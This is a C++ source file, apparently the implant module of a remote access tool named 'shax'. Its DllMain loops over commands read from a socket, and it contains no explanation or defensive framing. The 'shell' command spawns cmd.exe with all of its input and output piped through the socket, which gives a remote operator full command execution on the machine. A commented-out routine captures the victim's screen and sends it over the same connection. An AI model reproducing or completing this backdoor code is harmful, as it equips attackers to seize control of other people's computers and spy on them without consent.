#include "st_shax.hpp"
#include <iostream>

class command {
public:
	command( shax* shx ) {
		m_shax = shx;
	}

	bool execute_cmd( std::string cmd ) {

		auto prs = new parser( cmd );

		if ( prs->is_cmd( "send" ) ) {
			if ( prs->has_argument( "-m" ) ) {
                utils::println( std::string( "Got " + prs->get_argument( "-m" ) ),
                                msg_color::light_green, msg_type::success );
				return true;
			}
		}

        if ( prs->is_cmd( "shell" ) ) {

            auto ni = "cmd.exe";
            auto si = STARTUPINFO{ sizeof( STARTUPINFO ) };
            auto pi = PROCESS_INFORMATION{};
            si.dwFlags    = STARTF_USESTDHANDLES;
            si.hStdInput  = (HANDLE)m_shax->m_sock;
            si.hStdOutput = (HANDLE)m_shax->m_sock;
            si.hStdError  = (HANDLE)m_shax->m_sock;

            if ( CreateProcess( NULL, (LPSTR)ni, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi ) ) {
                WaitForSingleObject( pi.hProcess, INFINITE );
                CloseHandle( pi.hProcess );
                CloseHandle( pi.hThread );
                return true;
            }
        }

#pragma region NEED_FIX
		/*if ( prs->is_cmd( "screengrab" ) ) {

            BITMAP bmp;
            auto hdcScr = CreateDC( L"DISPLAY", NULL, NULL, NULL );
            auto hdcMem = CreateCompatibleDC( hdcScr );
            auto iXRes = GetDeviceCaps( hdcScr, HORZRES );
            auto iYRes = GetDeviceCaps( hdcScr, VERTRES );

            auto hbmScr = CreateCompatibleBitmap( hdcScr, iXRes, iYRes );
            if ( hbmScr == 0 ) 
                return 0;
            if ( !SelectObject( hdcMem, hbmScr ) ) 
                return 0;
            if ( !StretchBlt( hdcMem, 0, 0, iXRes, iYRes, hdcScr, 0, 0, iXRes, iYRes, SRCCOPY ) )
                return 0;
            if ( !GetObject( hbmScr, sizeof( BITMAP ), (LPSTR)&bmp ) ) 
                return 0;

            auto cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
            if ( cClrBits == 1 ) cClrBits = 1;
            else if ( cClrBits <= 4 ) cClrBits = 4;
            else if ( cClrBits <= 8 ) cClrBits = 8;
            else if ( cClrBits <= 16 ) cClrBits = 16;
            else if ( cClrBits <= 24 ) cClrBits = 24;
            else cClrBits = 32;
            
            auto pbmi = cClrBits != 24 
                ? (PBITMAPINFO)LocalAlloc( LPTR, sizeof( BITMAPINFOHEADER ) + sizeof( RGBQUAD ) * (1 << cClrBits) ) 
                : (PBITMAPINFO)LocalAlloc( LPTR, sizeof( BITMAPINFOHEADER ) );

            pbmi->bmiHeader.biSize = sizeof( BITMAPINFOHEADER );
            pbmi->bmiHeader.biWidth = bmp.bmWidth;
            pbmi->bmiHeader.biHeight = bmp.bmHeight;
            pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
            pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
            pbmi->bmiHeader.biCompression = BI_RGB;
            pbmi->bmiHeader.biSizeImage = (pbmi->bmiHeader.biWidth + 7) / 8 * pbmi->bmiHeader.biHeight * cClrBits;
            pbmi->bmiHeader.biClrImportant = 0;

            if ( cClrBits < 24 )
                pbmi->bmiHeader.biClrUsed = (1 << cClrBits);

            auto hdr = BITMAPFILEHEADER{};
            auto pbih = (PBITMAPINFOHEADER)pbmi;
            auto lpBits = (LPBYTE)GlobalAlloc( GMEM_FIXED, pbih->biSizeImage );

            if ( !lpBits ) 
                return 0;

            if ( !GetDIBits( hdcMem, hbmScr, 0, (WORD)pbih->biHeight, lpBits, pbmi, DIB_RGB_COLORS ) ) 
                return 0;

            hdr.bfSize = (DWORD)(sizeof( BITMAPFILEHEADER ) + pbih->biSize + pbih->biClrUsed * sizeof( RGBQUAD ) + pbih->biSizeImage);
            hdr.bfOffBits = (DWORD)sizeof( BITMAPFILEHEADER ) + pbih->biSize + pbih->biClrUsed * sizeof( RGBQUAD );
            hdr.bfType = 0x4d42;
            hdr.bfReserved1 = 0;
            hdr.bfReserved2 = 0;

            auto size = sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) + pbih->biClrUsed * sizeof( RGBQUAD ) + pbih->biSizeImage;
            auto data = new BYTE[size];
            memcpy( data, &hdr, sizeof( BITMAPFILEHEADER ) );
            memcpy( data + sizeof( BITMAPFILEHEADER ), pbih, sizeof( BITMAPINFOHEADER ) + pbih->biClrUsed * sizeof( RGBQUAD ) );
            memcpy( data + sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) + pbih->biClrUsed * sizeof( RGBQUAD ), (LPSTR)lpBits, pbih->biSizeImage );

            m_shax->snd_arr( data, size );
            printf( "screen_size %d\n", size );

            GlobalFree( (HGLOBAL)lpBits );
            ReleaseDC( 0, hdcScr );
            ReleaseDC( 0, hdcMem );

            return true;
		}*/
#pragma endregion

        if ( prs->is_cmd( "download" ) ) {

        }

        if ( prs->is_cmd( "upload" ) ) {

        }

		if ( prs->is_cmd( "ping" ) ) {
            return m_shax->snd_str( "pong" );
		}

        if ( prs->is_cmd( "alive?" ) ) {
            return true;
        }

		return true;
	}

	shax* m_shax;
};

BOOL APIENTRY DllMain( HMODULE hModule, SOCKADDR_IN* addr, SOCKET* sock )
{
	auto shx = new shax( *addr, *sock );
	auto cmd = new command( shx );

	std::cout << "[+] Shax session opened -> " << utils::ip_of( shx->m_addr ) << ":" << shx->m_addr.sin_port << std::endl;

	while ( true ) {
		auto data = shx->rcv_str();
		cmd->execute_cmd( data.first );
	}

	return TRUE;
}